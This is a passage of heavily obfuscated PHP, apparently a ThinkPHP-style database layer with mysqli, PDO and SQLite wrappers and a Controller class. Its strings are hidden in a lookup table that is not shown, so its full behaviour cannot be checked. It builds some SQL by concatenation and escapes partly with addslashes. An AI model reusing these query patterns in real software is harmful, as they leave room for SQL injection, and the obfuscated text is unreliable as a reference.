$©éËøì¾ =& $_SERVER[å¸¿•¶£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $©é°øå; if ($this->queryID) { $this->free(); } think_action_status($©éËøì¾[23], 1); think_status($©éËøì¾[24]); $this->queryID = $this->_linkID->query($©é°øå); if ($this->_linkID->more_results()) { while (($„şÄŞ‰å = $this->_linkID->next_result()) != NULL) { $„şÄŞ‰å->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($½‚Êê•¡) { $‘åûŠ®ğ =& $_SERVER[å¸¿•¶£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $½‚Êê•¡; if ($this->queryID) { $this->free(); } think_action_status($‘åûŠ®ğ[25], 1); think_status($‘åûŠ®ğ[24]); $ŠàÛ çı = $this->_linkID->query($½‚Êê•¡); $this->debug(); if (!1 === $ŠàÛ çı) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚’Á³ãö = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$‚’Á³ãö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ØÄé©Äş = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ØÄé©Äş) { $this->error(); return !1; } } return !0; } private function getAll() { $ûŠ¡¢· = array(); if ($this->numRows > 0) { for ($ë‘ô–¨ = 0; $ë‘ô–¨ < $this->numRows; $ë‘ô–¨++) { $ûŠ¡¢·[$ë‘ô–¨] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ûŠ¡¢·; } public function getFields($î¿ô÷¤‚) { $ï¦³ŸÀ± =& $_SERVER[å¸¿•¶£]; $Œì»ùü… = $this->query($ï¦³ŸÀ±[904] . $this->parseKey($î¿ô÷¤‚)); $ºØşÕ‘ = array(); if ($Œì»ùü…) { foreach ($Œì»ùü… as $·Ï Úİ => $É§ü«½¸) { $ºØşÕ‘[$É§ü«½¸[$ï¦³ŸÀ±[31]]] = array($ï¦³ŸÀ±[32] => $É§ü«½¸[$ï¦³ŸÀ±[31]], $ï¦³ŸÀ±[33] => $É§ü«½¸[$ï¦³ŸÀ±[34]], $ï¦³ŸÀ±[35] => (bool) ($É§ü«½¸[$ï¦³ŸÀ±[36]] === $ï¦³ŸÀ±[12]), $ï¦³ŸÀ±[37] => $É§ü«½¸[$ï¦³ŸÀ±[38]], $ï¦³ŸÀ±[39] => strtolower($É§ü«½¸[$ï¦³ŸÀ±[40]]) == $ï¦³ŸÀ±[41], $ï¦³ŸÀ±[42] => strtolower($É§ü«½¸[$ï¦³ŸÀ±[43]]) == $ï¦³ŸÀ±[44]); } } return $ºØşÕ‘; } public function getTables($æÏà’àÚ = '') { $ŞÖ·¯ä§ =& $_SERVER[å¸¿•¶£]; $Ù•ÊË¯¶ = !empty($æÏà’àÚ) ? $ŞÖ·¯ä§[906] . $æÏà’àÚ . $ŞÖ·¯ä§[907] : $ŞÖ·¯ä§[908]; $‡ïâßå¡ = $this->query($Ù•ÊË¯¶); $Ò¡‹ù Ù = array(); if ($‡ïâßå¡) { foreach ($‡ïâßå¡ as $ó¤Å°¿â => $ë²ë®÷) { $Ò¡‹ù Ù[$ó¤Å°¿â] = current($ë²ë®÷); } } return $Ò¡‹ù Ù; } public function replace($¢Í™èäŠ, $ñôÛ†ù = array()) { $ï÷ÌÒÙ =& $_SERVER[å¸¿•¶£]; foreach ($¢Í™èäŠ as $Ú‰òñîÛ => $İ¢¶–Ø×) { $Àç¾· = $this->parseValue($İ¢¶–Ø×); if (is_scalar($Àç¾·)) { $ı¹ÇêóË[] = $Àç¾·; $²ÉŠ¹şƒ[] = $this->parseKey($Ú‰òñîÛ); } } $©“°ã€Á = $ï÷ÌÒÙ[909] . $this->parseTable($ñôÛ†ù[$ï÷ÌÒÙ[279]]) . $ï÷ÌÒÙ[910] . implode($ï÷ÌÒÙ[50], $²ÉŠ¹şƒ) . $ï÷ÌÒÙ[911] . implode($ï÷ÌÒÙ[50], $ı¹ÇêóË) . $ï÷ÌÒÙ[912]; return $this->execute($©“°ã€Á); } public function insertAll($ÌÏÊÚ–², $­ôœ¶Ÿ“ = array(), $Ïö¯÷ˆØ = false) { $’Şƒ›ô =& $_SERVER[å¸¿•¶£]; if (!is_array($ÌÏÊÚ–²[0])) { return !1; } $Ş°Å’–¬ = array_keys($ÌÏÊÚ–²[0]); $Å¾·äË¦ = array(); foreach ($ÌÏÊÚ–² as $ŒúŒÅÎŠ) { $ğˆİÅÀö = array(); foreach ($ŒúŒÅÎŠ as $òª¥Ö²· => $òí–î‡) { $òí–î‡ = $this->parseValue($òí–î‡); if (is_scalar($òí–î‡)) { $ğˆİÅÀö[] = $òí–î‡; } } $Å¾·äË¦[] = $’Şƒ›ô[260] . implode($’Şƒ›ô[50], $ğˆİÅÀö) . $’Şƒ›ô[912]; } array_walk($Ş°Å’–¬, array($this, $’Şƒ›ô[913])); $ç™şõˆ° = $Ïö¯÷ˆØ ? $’Şƒ›ô[914] : $’Şƒ›ô[915]; $Ù¨¤ã† = $ç™şõˆ° . $’Şƒ›ô[916] . $this->parseTable($­ôœ¶Ÿ“[$’Şƒ›ô[279]]) . $’Şƒ›ô[910] . implode($’Şƒ›ô[50], $Ş°Å’–¬) . $’Şƒ›ô[917] . implode($’Şƒ›ô[50], $Å¾·äË¦); return $this->execute($Ù¨¤ã†); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¶æ•Ú— =& $_SERVER[å¸¿•¶£]; $this->error = $this->_linkID->errno . $¶æ•Ú—[4] . $this->_linkID->error; if ($¶æ•Ú—[12] != $this->queryStr) { $this->error .= LNG($¶æ•Ú—[48]) . $this->queryStr; } think_trace($this->error, $¶æ•Ú—[12], $¶æ•Ú—[49]); return $this->error; } public function escapeString($Š›¹È•­) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Š›¹È•­); } else { return addslashes($Š›¹È•­); } } public function parseKey(&$Â¥Ù°ã©, $ĞŞë¿•˜ = true) { $ŠÛÆ­”‚ =& $_SERVER[å¸¿•¶£]; if ($ĞŞë¿•˜) { $Â¥Ù°ã© = $this->parseKeyCheck($Â¥Ù°ã©); } if ($Â¥Ù°ã© != $ŠÛÆ­”‚[189] && !preg_match($ŠÛÆ­”‚[918], $Â¥Ù°ã©)) { $Â¥Ù°ã© = $ŠÛÆ­”‚[385] . trim($Â¥Ù°ã©, $ŠÛÆ­”‚[385]) . $ŠÛÆ­”‚[385]; } return $Â¥Ù°ã©; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($òæ°‡ã¦ = '') { $ÉØ»…ô =& $_SERVER[å¸¿•¶£]; if (!class_exists($ÉØ»…ô[921])) { think_exception(think_lang($ÉØ»…ô[14]) . $ÉØ»…ô[922]); } if (!empty($òæ°‡ã¦)) { $this->config = $òæ°‡ã¦; if (empty($this->config[$ÉØ»…ô[17]])) { $this->config[$ÉØ»…ô[17]] = array(); } } } public function connect($Šà¨â­ = '', $‰î¥ç’¨ = 0) { $İî·ü¬ =& $_SERVER[å¸¿•¶£]; if (!isset($this->linkID[$‰î¥ç’¨])) { if (empty($Šà¨â­)) { $Šà¨â­ = $this->config; } $ûØÑ’Ø‚ = !empty($Šà¨â­[$İî·ü¬[17]][$İî·ü¬[18]]) ? $Šà¨â­[$İî·ü¬[17]][$İî·ü¬[18]] : $this->pconnect; if ($ûØÑ’Ø‚) { $Šà¨â­[$İî·ü¬[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$‰î¥ç’¨] = new PDO($Šà¨â­[$İî·ü¬[923]], $Šà¨â­[$İî·ü¬[895]], $Šà¨â­[$İî·ü¬[896]], $Šà¨â­[$İî·ü¬[17]]); } catch (PDOException $ğ©Ïáä”) { think_exception($ğ©Ïáä”->getMessage()); } $this->dbType = $this->_getDsnType($Šà¨â­[$İî·ü¬[923]]); if (in_array($this->dbType, array($İî·ü¬[924], $İî·ü¬[925], $İî·ü¬[926], $İî·ü¬[927]))) { think_exception($İî·ü¬[928] . $this->dbType . $İî·ü¬[929] . $this->dbType . $İî·ü¬[930]); } if (!$this->linkID[$‰î¥ç’¨]) { think_exception($İî·ü¬[931]); } try { $this->linkID[$‰î¥ç’¨]->exec($İî·ü¬[932] . think_config($İî·ü¬[898])); } catch (Exception $ğ©Ïáä”) { } $this->connected = !0; if (1 != think_config($İî·ü¬[22])) { unset($this->config); } } return $this->linkID[$‰î¥ç’¨]; } public function free() { $this->PDOStatement = null; } public function query($å†Æóö, $¥ÊŞ‡äÅ = array()) { $×‘ó“¿† =& $_SERVER[å¸¿•¶£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $å†Æóö; if (!empty($¥ÊŞ‡äÅ)) { $this->queryStr .= $×‘ó“¿†[933] . print_r($¥ÊŞ‡äÅ, !0) . $×‘ó“¿†[934]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($×‘ó“¿†[23], 1); think_status($×‘ó“¿†[24]); $this->PDOStatement = $this->_linkID->prepare($å†Æóö); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $éù³é„½ = $this->PDOStatement->execute($¥ÊŞ‡äÅ); $this->debug(); if (!1 === $éù³é„½) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($À§öá†, $¡Ùôğô— = array()) { $í¬ÃÀ»Õ =& $_SERVER[å¸¿•¶£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $À§öá†; if (!empty($¡Ùôğô—)) { $this->queryStr .= $í¬ÃÀ»Õ[933] . print_r($¡Ùôğô—, !0) . $í¬ÃÀ»Õ[934]; } $•‘¦æùø = !1; if ($this->dbType == $í¬ÃÀ»Õ[927]) { if (preg_match($í¬ÃÀ»Õ[935], $this->queryStr, $Ä¼„–Ş )) { $this->table = think_config($í¬ÃÀ»Õ[936]) . str_ireplace(think_config($í¬ÃÀ»Õ[937]), $í¬ÃÀ»Õ[378], $Ä¼„–Ş [2]); $•‘¦æùø = (bool) $this->query($í¬ÃÀ»Õ[938] . strtoupper($this->table) . $í¬ÃÀ»Õ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($í¬ÃÀ»Õ[25], 1); think_status($í¬ÃÀ»Õ[24]); $this->PDOStatement = $this->_linkID->prepare($À§öá†); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¶ıÖ§é = $this->PDOStatement->execute($¡Ùôğô—); $this->debug(); if (!1 === $¶ıÖ§é) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($•‘¦æùø || preg_match($í¬ÃÀ»Õ[939], $À§öá†)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÏÒä¯­¬ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ÏÒä¯­¬) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‚ñ‰ïûš = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‚ñ‰ïûš) { $this->error(); return !1; } } return !0; } private function getAll() { $Å´ê’ëÈ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Å´ê’ëÈ); return $Å´ê’ëÈ; } public function getFields($Ş‡ı¥Õ) { $Æ‹ìˆäì =& $_SERVER[å¸¿•¶£]; $this->initConnect(!0); if (think_config($Æ‹ìˆäì[940])) { $î ¢³€â = str_replace($Æ‹ìˆäì[941], $Ş‡ı¥Õ, think_config($Æ‹ìˆäì[940])); } else { switch ($this->dbType) { case $Æ‹ìˆäì[924]: case $Æ‹ìˆäì[942]: $î ¢³€â = "\x53\x45\x4c\x45\103\124\x20\40\40\x63\x6f\x6c\165\155\x6e\137\x6e\141\155\145\x20\141\163\x20\x27\x4e\x61\x6d\x65\x27\54\x20\x20\x20\144\x61\x74\x61\137\164\x79\x70\x65\x20\x61\163\x20\x27\124\171\x70\145\x27\x2c\40\x20\x20\143\x6f\154\x75\155\x6e\137\144\x65\x66\x61\x75\x6c\164\x20\141\163\40\x27\104\145\x66\141\x75\154\x74\x27\54\x20\40\x20\x69\x73\x5f\156\x75\154\x6c\x61\x62\154\x65\x20\141\x73\x20\x27\116\165\154\x6c\x27\xa\11\11\x46\x52\117\115\11\x69\156\x66\157\162\x6d\x61\164\x69\157\156\137\x73\x63\150\x65\x6d\x61\x2e\164\x61\142\x6c\x65\163\40\x41\123\x20\x74\12\x9\11\x4a\x4f\x49\x4e\x9\x69\x6e\146\157\162\155\141\164\151\x6f\156\x5f\163\x63\x68\145\155\141\x2e\143\x6f\154\x75\155\156\163\40\101\x53\x20\x63\12\x9\x9\x4f\116\x20\x20\164\56\164\141\142\x6c\x65\x5f\x63\x61\164\141\x6c\x6f\147\x20\x3d\x20\x63\56\164\141\142\154\x65\x5f\x63\x61\x74\141\154\x6f\147\12\11\x9\101\x4e\104\40\x74\x2e\164\x61\142\x6c\x65\x5f\x73\143\150\145\155\x61\40\75\40\143\x2e\x74\141\x62\x6c\145\137\x73\143\150\x65\x6d\141\12\x9\x9\101\x4e\104\40\164\56\164\141\142\x6c\145\x5f\x6e\x61\x6d\145\40\x3d\40\x63\56\x74\141\142\x6c\x65\137\156\141\155\x65\12\x9\11\127\x48\x45\x52\105\40\x20\40\164\56\x74\141\142\x6c\145\x5f\x6e\141\155\x65\40\75\40\x27{$Ş‡ı¥Õ}\x27"; break; case $Æ‹ìˆäì[943]: $î ¢³€â = $Æ‹ìˆäì[944] . $Ş‡ı¥Õ . $Æ‹ìˆäì[945]; break; case $Æ‹ìˆäì[925]: case $Æ‹ìˆäì[927]: $î ¢³€â = $Æ‹ìˆäì[946] . $Æ‹ìˆäì[947] . $Æ‹ìˆäì[948] . strtoupper($Ş‡ı¥Õ) . $Æ‹ìˆäì[949] . strtoupper($Ş‡ı¥Õ) . $Æ‹ìˆäì[950]; break; case $Æ‹ìˆäì[951]: $î ¢³€â = $Æ‹ìˆäì[952] . $Ş‡ı¥Õ . $Æ‹ìˆäì[953]; break; case $Æ‹ìˆäì[926]: break; case $Æ‹ìˆäì[954]: default: $î ¢³€â = $Æ‹ìˆäì[955] . ($this->dbType == $Æ‹ìˆäì[954] ? "\x60{$Ş‡ı¥Õ}\140" : $Ş‡ı¥Õ); } } $Ã·Ø€×† = $this->query($î ¢³€â); $ãñ¦³Åñ = array(); if ($Ã·Ø€×†) { foreach ($Ã·Ø€×† as $³½È¹øÇ => $‹Ã£€Æì) { $‹Ã£€Æì = array_change_key_case($‹Ã£€Æì); $‹Ã£€Æì[$Æ‹ìˆäì[32]] = isset($‹Ã£€Æì[$Æ‹ìˆäì[32]]) ? $‹Ã£€Æì[$Æ‹ìˆäì[32]] : $Æ‹ìˆäì[378]; $‹Ã£€Æì[$Æ‹ìˆäì[33]] = isset($‹Ã£€Æì[$Æ‹ìˆäì[33]]) ? $‹Ã£€Æì[$Æ‹ìˆäì[33]] : $Æ‹ìˆäì[378]; $™‡¡Âêª = isset($‹Ã£€Æì[$Æ‹ìˆäì[273]]) ? $‹Ã£€Æì[$Æ‹ìˆäì[273]] : $‹Ã£€Æì[$Æ‹ìˆäì[32]]; $ãñ¦³Åñ[$™‡¡Âêª] = array($Æ‹ìˆäì[32] => $™‡¡Âêª, $Æ‹ìˆäì[33] => $‹Ã£€Æì[$Æ‹ìˆäì[33]], $Æ‹ìˆäì[35] => (bool) (isset($‹Ã£€Æì[$Æ‹ìˆäì[103]]) && $‹Ã£€Æì[$Æ‹ìˆäì[103]] === $Æ‹ìˆäì[12] || isset($‹Ã£€Æì[$Æ‹ìˆäì[35]]) && $‹Ã£€Æì[$Æ‹ìˆäì[35]] === $Æ‹ìˆäì[12]), $Æ‹ìˆäì[37] => isset($‹Ã£€Æì[$Æ‹ìˆäì[37]]) ? $‹Ã£€Æì[$Æ‹ìˆäì[37]] : (isset($‹Ã£€Æì[$Æ‹ìˆäì[56]]) ? $‹Ã£€Æì[$Æ‹ìˆäì[56]] : $Æ‹ìˆäì[378]), $Æ‹ìˆäì[39] => isset($‹Ã£€Æì[$Æ‹ìˆäì[94]]) ? strtolower($‹Ã£€Æì[$Æ‹ìˆäì[94]]) == $Æ‹ìˆäì[41] : (isset($‹Ã£€Æì[$Æ‹ìˆäì[57]]) ? $‹Ã£€Æì[$Æ‹ìˆäì[57]] : !1), $Æ‹ìˆäì[42] => isset($‹Ã£€Æì[$Æ‹ìˆäì[956]]) ? strtolower($‹Ã£€Æì[$Æ‹ìˆäì[956]]) == $Æ‹ìˆäì[44] : (isset($‹Ã£€Æì[$Æ‹ìˆäì[94]]) ? $‹Ã£€Æì[$Æ‹ìˆäì[94]] : !1)); } } return $ãñ¦³Åñ; } public function getTables($÷¢ªú“‡ = '') { $Ôùıè™ =& $_SERVER[å¸¿•¶£]; if (think_config($Ôùıè™[957])) { $‰ØúÀÔ” = str_replace($Ôùıè™[958], $÷¢ªú“‡, think_config($Ôùıè™[957])); } else { switch ($this->dbType) { case $Ôùıè™[925]: case $Ôùıè™[927]: $‰ØúÀÔ” = $Ôùıè™[959]; break; case $Ôùıè™[924]: case $Ôùıè™[942]: $‰ØúÀÔ” = $Ôùıè™[960]; break; case $Ôùıè™[951]: $‰ØúÀÔ” = $Ôùıè™[961]; break; case $Ôùıè™[926]: think_exception(think_lang($Ôùıè™[962]) . $Ôùıè™[963]); break; case $Ôùıè™[943]: $‰ØúÀÔ” = $Ôùıè™[45] . $Ôùıè™[46] . $Ôùıè™[47]; break; case $Ôùıè™[954]: default: if (!empty($÷¢ªú“‡)) { $‰ØúÀÔ” = $Ôùıè™[906] . $÷¢ªú“‡ . $Ôùıè™[907]; } else { $‰ØúÀÔ” = $Ôùıè™[908]; } } } $ÑïúÓŞ´ = $this->query($‰ØúÀÔ”); $÷ûÉ¥ş = array(); foreach ($ÑïúÓŞ´ as $Ö—»È³˜ => $ù°šğú±) { $÷ûÉ¥ş[$Ö—»È³˜] = current($ù°šğú±); } return $÷ûÉ¥ş; } protected function parseLimit($Ç†ÕÕÊë) { $ôìáòòŒ =& $_SERVER[å¸¿•¶£]; $Ã¹À†ôë = $ôìáòòŒ[12]; if (!empty($Ç†ÕÕÊë)) { switch ($this->dbType) { case $ôìáòòŒ[951]: case $ôìáòòŒ[943]: $Ç†ÕÕÊë = explode($ôìáòòŒ[50], $Ç†ÕÕÊë); if (count($Ç†ÕÕÊë) > 1) { $Ã¹À†ôë .= $ôìáòòŒ[51] . $Ç†ÕÕÊë[1] . $ôìáòòŒ[52] . $Ç†ÕÕÊë[0] . $ôìáòòŒ[53]; } else { $Ã¹À†ôë .= $ôìáòòŒ[51] . $Ç†ÕÕÊë[0] . $ôìáòòŒ[53]; } break; case $ôìáòòŒ[924]: case $ôìáòòŒ[942]: break; case $ôìáòòŒ[926]: break; case $ôìáòòŒ[925]: case $ôìáòòŒ[927]: break; case $ôìáòòŒ[954]: default: $Ã¹À†ôë .= $ôìáòòŒ[51] . $Ç†ÕÕÊë . $ôìáòòŒ[53]; } } return $Ã¹À†ôë; } public function parseKey(&$”¢ô–Ş, $ãÓ¬ğĞ = true) { $ôÆ€Ë¶Õ =& $_SERVER[å¸¿•¶£]; if ($ãÓ¬ğĞ) { $”¢ô–Ş = $this->parseKeyCheck($”¢ô–Ş); } if ($this->dbType == $ôÆ€Ë¶Õ[954]) { if ($”¢ô–Ş != $ôÆ€Ë¶Õ[189] && !preg_match($ôÆ€Ë¶Õ[918], $”¢ô–Ş)) { $”¢ô–Ş = $ôÆ€Ë¶Õ[385] . trim($”¢ô–Ş, $ôÆ€Ë¶Õ[385]) . $ôÆ€Ë¶Õ[385]; } return $”¢ô–Ş; } else { return parent::parseKey($”¢ô–Ş, $ãÓ¬ğĞ); } } public function close() { $this->_linkID = null; } public function error() { $Ô†ı©æè =& $_SERVER[å¸¿•¶£]; if ($this->PDOStatement) { $¬ª»É¿¬ = $this->PDOStatement->errorInfo(); $this->error = $¬ª»É¿¬[1] . $Ô†ı©æè[4] . $¬ª»É¿¬[2]; } else { $this->error = $Ô†ı©æè[12]; } if ($Ô†ı©æè[12] != $this->queryStr) { $this->error .= LNG($Ô†ı©æè[48]) . $this->queryStr; } think_trace($this->error, $Ô†ı©æè[12], $Ô†ı©æè[49]); return $this->error; } public function escapeString($ææ²¢³) { $úå¹öù× =& $_SERVER[å¸¿•¶£]; switch ($this->dbType) { case $úå¹öù×[951]: case $úå¹öù×[924]: case $úå¹öù×[942]: case $úå¹öù×[954]: return addslashes($ææ²¢³); case $úå¹öù×[926]: case $úå¹öù×[943]: case $úå¹öù×[925]: case $úå¹öù×[927]: return str_ireplace($úå¹öù×[58], $úå¹öù×[59], $ææ²¢³); } } protected function parseValue($—Âï±Ïô) { $…ÆÆ¨¨­ =& $_SERVER[å¸¿•¶£]; if (is_string($—Âï±Ïô)) { $ã ı ë€ = strpos($—Âï±Ïô, $…ÆÆ¨¨­[4]) === 0 && in_array($—Âï±Ïô, array_keys($this->bind)); $—Âï±Ïô = $ã ı ë€ ? $this->escapeString($—Âï±Ïô) : $…ÆÆ¨¨­[964] . $this->escapeString($—Âï±Ïô) . $…ÆÆ¨¨­[964]; } elseif (isset($—Âï±Ïô[0]) && is_string($—Âï±Ïô[0]) && strtolower($—Âï±Ïô[0]) == $…ÆÆ¨¨­[297]) { $—Âï±Ïô = $this->escapeString($—Âï±Ïô[1]); } elseif (is_array($—Âï±Ïô)) { $—Âï±Ïô = array_map(array($this, $…ÆÆ¨¨­[965]), $—Âï±Ïô); } elseif (is_bool($—Âï±Ïô)) { $—Âï±Ïô = $—Âï±Ïô ? $…ÆÆ¨¨­[88] : $…ÆÆ¨¨­[198]; } elseif (is_null($—Âï±Ïô)) { $—Âï±Ïô = $…ÆÆ¨¨­[103]; } return $—Âï±Ïô; } public function getLastInsertId() { $øê•èŞá =& $_SERVER[å¸¿•¶£]; switch ($this->dbType) { case $øê•èŞá[951]: case $øê•èŞá[943]: case $øê•èŞá[924]: case $øê•èŞá[942]: case $øê•èŞá[926]: case $øê•èŞá[954]: return $this->_linkID->lastInsertId(); case $øê•èŞá[925]: case $øê•èŞá[927]: $ ‘€¼Éº = $this->table; $¯Ú¢È©à = $this->query("\x53\105\114\x45\x43\124\x20{$ ‘€¼Éº}\x2e\x63\x75\x72\162\166\x61\154\40\143\165\162\162\x76\x61\x6c\x20\106\x52\117\x4d\40\144\165\x61\154"); return $¯Ú¢È©à ? $¯Ú¢È©à[0][$øê•èŞá[966]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¨Ìƒ²¯) { $¬È¨‘û =& $_SERVER[å¸¿•¶£]; if (!CacheLock::fileLock($¬È¨‘û[13])) { return !1; } $¾ü¡ìÉÀ = parent::query($¨Ìƒ²¯); CacheLock::fileUnLock($¬È¨‘û[13]); return $¾ü¡ìÉÀ; } public function execute($ÁºÆ™¥Ü) { $£›¯¯í¿ =& $_SERVER[å¸¿•¶£]; if (!CacheLock::fileLock($£›¯¯í¿[13])) { return !1; } $‡í™íÜ = parent::execute($ÁºÆ™¥Ü); CacheLock::fileUnLock($£›¯¯í¿[13]); return $‡í™íÜ; } } goto B ŸÃƒ¶‡‘; D’ÕÖè‰Ã•: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $€’¡®Ô =& $_SERVER[å¸¿•¶£]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$€’¡®Ô[6]] =& $config; $this->values[$€’¡®Ô[7]] =& $in; $this->tpl = TEMPLATE . MOD . $€’¡®Ô[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ˆ¨ÁïÉ˜) { if (1 === func_num_args()) { $this->{$ˆ¨ÁïÉ˜} = new $ˆ¨ÁïÉ˜(); } else { $Ç•Ì = new ReflectionClass($ˆ¨ÁïÉ˜); $æŞœ‡ß = func_get_args(); array_shift($æŞœ‡ß); $this->{$ˆ¨ÁïÉ˜} = $Ç•Ì->newInstanceArgs($æŞœ‡ß); } return $this->{$ˆ¨ÁïÉ˜}; } public function routeBind($òô’îĞ‡, $Çæ¨Ÿø‘, $ğ…³Êû® = 3) { $ü¦‹ÌŞ =& $_SERVER[å¸¿•¶£]; $°‰•­‹ğ = $this->in[$ü¦‹ÌŞ[9]]; $òô’îĞ‡ = str_replace($ü¦‹ÌŞ[10], $ü¦‹ÌŞ[11], trim(trim($òô’îĞ‡, $ü¦‹ÌŞ[8]), $ü¦‹ÌŞ[12])); if (!$òô’îĞ‡ || count($°‰•­‹ğ) <= $ğ…³Êû®) { return !1; } $ø¬±„ñ = !0; $İßÎßë‹ = explode($ü¦‹ÌŞ[8], $òô’îĞ‡); for ($­»çàğ” = 0; $­»çàğ” < count($İßÎßë‹); $­»çàğ”++) { if ($İßÎßë‹[$­»çàğ”] != $°‰•­‹ğ[$ğ…³Êû® + $­»çàğ”]) { $ø¬±„ñ = !1; break; } } if (!$ø¬±„ñ) { return; } call_user_func_array(array($this, $Çæ¨Ÿø‘), array()); } public function routeArgs($Ë¯Í¥º = 3) { $Ìğî¬•İ = $this->in[$_SERVER[å¸¿•¶£][9]]; if (count($Ìğî¬•İ) <= $Ë¯Í¥º) { return array(); } $²²ƒ´×‰ = array(); for ($éò€­¯ = $Ë¯Í¥º; $éò€­¯ < count($Ìğî¬•İ); $éò€­¯ += 2) { $²²ƒ´×‰[$Ìğî¬•İ[$éò€­¯]] = $Ìğî¬•İ[$éò€­¯ + 1]; $this->in[$Ìğî¬•İ[$éò€­¯]] = $Ìğî¬•İ[$éò€­¯ + 1]; } return $²²ƒ´×‰; } protected function assign($Å“Ñ×Öƒ, $—½¾öŠÊ) { $this->values[$Å“Ñ×Öƒ] = $—½¾öŠÊ; } protected function display($ñëÈÊ½) { ob_end_clean(); extract($this->values); require $this->tpl . $ñëÈÊ½; } } class DbSqliteBase extends Db { public function __construct($ÜÑËµ´Ô = '') { $ĞêŸÆ°Ã =& $_SERVER[å¸¿•¶£]; if (!extension_loaded($ĞêŸÆ°Ã[13])) { think_exception(think_lang($ĞêŸÆ°Ã[14]) . $ĞêŸÆ°Ã[15]); } if (!empty($ÜÑËµ´Ô)) { if (!isset($ÜÑËµ´Ô[$ĞêŸÆ°Ã[16]])) { $ÜÑËµ´Ô[$ĞêŸÆ°Ã[16]] = 438; } $this->config = $ÜÑËµ´Ô; if (empty($this->config[$ĞêŸÆ°Ã[17]])) { $this->config[$ĞêŸÆ°Ã[17]] = array(); } } } public function connect($¢¯„²À = '', $Êİ¿ÓÊ´ = 0) { $¬ï—õ€ñ =& $_SERVER[å¸¿•¶£]; if (!isset($this->linkID[$Êİ¿ÓÊ´])) { if (empty($¢¯„²À)) { $¢¯„²À = $this->config; } $áÁÇøä´ = !empty($¢¯„²À[$¬ï—õ€ñ[17]][$¬ï—õ€ñ[18]]) ? $¢¯„²À[$¬ï—õ€ñ[17]][$¬ï—õ€ñ[18]] : $this->pconnect; $•ö°¢ÜÂ = $áÁÇøä´ ? $¬ï—õ€ñ[19] : $¬ï—õ€ñ[20]; $this->linkID[$Êİ¿ÓÊ´] = $•ö°¢ÜÂ($¢¯„²À[$¬ï—õ€ñ[21]], $¢¯„²À[$¬ï—õ€ñ[16]]); if (!$this->linkID[$Êİ¿ÓÊ´]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Êİ¿ÓÊ´], 30000); if (1 != think_config($¬ï—õ€ñ[22])) { unset($this->config); } } return $this->linkID[$Êİ¿ÓÊ´]; } public function free() { $this->queryID = null; } public function query($—Êøâ¥) { $Ûø‰ƒòÜ =& $_SERVER[å¸¿•¶£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—Êøâ¥; if ($this->queryID) { $this->free(); } think_action_status($Ûø‰ƒòÜ[23], 1); think_status($Ûø‰ƒòÜ[24]); $this->queryID = sqlite_query($this->_linkID, $—Êøâ¥); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÕìÂËüŠ = $this->getAll(); return $ÕìÂËüŠ; } } public function execute($ÎŸƒÊúÄ) { $ø­Çë¬Ù =& $_SERVER[å¸¿•¶£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÎŸƒÊúÄ; if ($this->queryID) { $this->free(); } think_action_status($ø­Çë¬Ù[25], 1); think_status($ø­Çë¬Ù[24]); $ª†•»œš = sqlite_exec($this->_linkID, $ÎŸƒÊúÄ); $this->debug(); if (!1 === $ª†•»œš) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[å¸¿•¶£][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $éôÑ¥ê = sqlite_query($this->_linkID, $_SERVER[å¸¿•¶£][27]); if (!$éôÑ¥ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $µÌòìı’ = sqlite_query($this->_linkID, $_SERVER[å¸¿•¶£][28]); if 